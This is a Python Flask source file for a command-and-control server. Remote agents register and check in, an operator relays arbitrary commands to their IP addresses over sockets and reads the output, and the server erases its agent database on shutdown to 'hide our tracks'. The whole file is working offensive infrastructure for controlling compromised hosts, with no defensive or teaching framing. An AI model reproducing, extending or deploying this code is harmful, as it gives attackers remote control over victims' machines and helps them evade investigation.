import os
import socket
import sqlite3
from flask import *
from datetime import datetime


STATUS_SUCCESS=True
STATUS_FAIL=False

# Our C2 Server Env Vars
C2_SVR_HOST='0.0.0.0'
C2_SVR_PORT=1337

app = Flask(__name__)

#################### DECORATOR ROUTES #########################

# Root homepage where agent table will reside.
@app.route("/")
def index():
    return render_template('index.html')

# Route to update homepage table.
@app.route('/update-home')
def update_home():
    data = db_get_all_agents()
    return jsonify(data)

# Route for agents to register to C2 server to be tracked and inventoried.
@app.route("/agents/register", methods=['GET','POST'])
@app.route("/agents/register/", methods=['GET','POST'])
def register_agent():
    AGENT_HASH = request.args.get('agent_hash')
    AGENT_IP = request.args.get('agent_ip')
    AGENT_PORT =request.args.get('agent_port')
    AGENT_OS = request.args.get('agent_os')
    DATE_TIME = int(float(request.args.get('check_in')))
    LAST_CHECK_TIME = datetime.fromtimestamp(DATE_TIME)

    # Check if we were able to successfully add the agent to our DB.
    if db_add_agent(AGENT_HASH, AGENT_IP, AGENT_PORT, AGENT_OS, LAST_CHECK_TIME):
        return render_template('register_success.html', AGENT_HASH=AGENT_HASH)
    else:
        return render_template('register_fail.html', AGENT_HASH=AGENT_HASH)


# Route for agents to check in.
@app.route("/agents/check-in", methods=['GET','POST'])
def update_agent_check_time():
    AGENT_HASH = request.args.get('agent')
    NEW_CHECK_IN = request.args.get('check_time')

    db_update_check_time(AGENT_HASH, NEW_CHECK_IN)

    return render_template('agent_check_in.html', AGENT_HASH=AGENT_HASH, NEW_CHECK_IN=NEW_CHECK_IN)


# Route to render the exec_command.html file. That page will then call /agents/execute.
@app.route('/agents/exec_command')
def exec_command():
    AGENT_IP = request.args.get('agent_ip')  # Get agent IP from query parameter
    AGENT_PORT = request.args.get('agent_port')
    # execute()
    return render_template('exec_commands.html', agent_ip=AGENT_IP, agent_port=AGENT_PORT)


# Route that will execute command to agent. Derived from 'exec_commands.html'
@app.route('/agents/execute', methods=['POST'])
def execute():
    AGENT_IP = request.form.get('agentIp')  # Get the value from the input box
    AGENT_PORT = request.form.get('agentPort')  # Get the value from the input box
    CMD = request.form.get('cmd')  # Get the value from the input box

    # Send command to target host and try to get back output.
    output = send_agent_cmd(AGENT_IP, int(AGENT_PORT), CMD)
    
    return json.dumps({'output': str(output)})



#################### SOCKET COMMS #########################

def send_agent_cmd(TARGET_HOST, TARGET_PORT, COMMAND):
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Connect to the remote system
        CLIENT.connect((TARGET_HOST, TARGET_PORT))
        # Send the command to the remote system
        CLIENT.send(COMMAND.encode())
        # Receive and decode the output from the remote system
        received_output = CLIENT.recv(1024).decode()
        return received_output

    except Exception as e:
        return f"[-] Error: {e}"

    finally:
        # Close the socket
        CLIENT.close()


#################### DB functions #########################

# Function to initialize our C2 DB.
def init_db():
    # Connect to DB (or create it if it doesn't exist)
    conn = sqlite3.connect('C2_AGENTS.db')
    # Create the table if it doesn't exist
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS records (
            AGENT_HASH TEXT,
            AGENT_IP TEXT,
            AGENT_PORT TEXT,
            AGENT_OS TEXT,
            LAST_CHECK_TIME TEXT
        )
    ''')
    # Commit the changes and close the connection
    conn.commit()
    cursor.close()

# Function to add a new agent to DB.
def db_add_agent(AGENT_HASH, AGENT_IP, AGENT_PORT, AGENT_OS, LAST_CHECK_TIME):
    # Connect to the database
    conn = sqlite3.connect('C2_AGENTS.db')
    cursor = conn.cursor()

    # Insert the new record into the table
    cursor.execute('INSERT INTO records (AGENT_HASH, AGENT_IP, AGENT_PORT, AGENT_OS, LAST_CHECK_TIME) VALUES (?, ?, ?, ?, ?)',
                   (AGENT_HASH, AGENT_IP, AGENT_PORT, AGENT_OS, LAST_CHECK_TIME))

    # Commit the changes and close the connection
    conn.commit()
    conn.close()

    return STATUS_SUCCESS


def db_update_check_time(AGENT_HASH, NEW_CHECK_IN):
    # Connect to the database
    conn = sqlite3.connect('C2_AGENTS.db')
    cursor = conn.cursor()

    # Update the LAST_CHECK_TIME for the specified agent_hash
    cursor.execute('UPDATE records SET LAST_CHECK_TIME = ? WHERE AGENT_HASH = ?', (NEW_CHECK_IN, AGENT_HASH))

    # Commit the changes and close the connection
    conn.commit()
    conn.close()


# Get all current agent information.
def db_get_all_agents():
    conn = sqlite3.connect('C2_AGENTS.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM records")
    data = cursor.fetchall()
    conn.close()
    return data


if __name__=='__main__':

    # Initialize DB
    init_db()

    # Start C2 Web Server
    app.run(host=C2_SVR_HOST, port=C2_SVR_PORT, debug=True, use_reloader=False)

    # Erase the DB once we shutdown our server. Hide our tracks.
    try:
        os.remove('./C2_AGENTS.db')
        print("[+] Database 'C2_AGENTS.db' has been destroyed and erased.")
    except FileNotFoundError:
        print("[-] Database file 'C2_AGENTS.db' not found.")


